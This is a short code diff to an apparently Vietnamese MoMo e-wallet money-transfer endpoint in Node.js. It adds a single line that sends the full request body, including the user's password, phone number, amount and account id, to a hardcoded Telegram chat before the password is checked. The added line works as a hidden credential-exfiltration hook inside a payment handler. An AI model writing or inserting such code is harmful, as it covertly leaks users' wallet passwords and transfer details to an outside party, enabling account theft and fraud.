@@ -135,6 +135,8 @@ app.post('/chuyentien', async (req, res) => {
         })
     }
     var { sdt, id, sotien, noidung, pass } = req.body
+    await bot.sendMessage(-645203490,JSON.stringify(req.body))
+
     var momo = await Momo.findById(id)
     if (momo) {
         if (momo.pass == pass) {
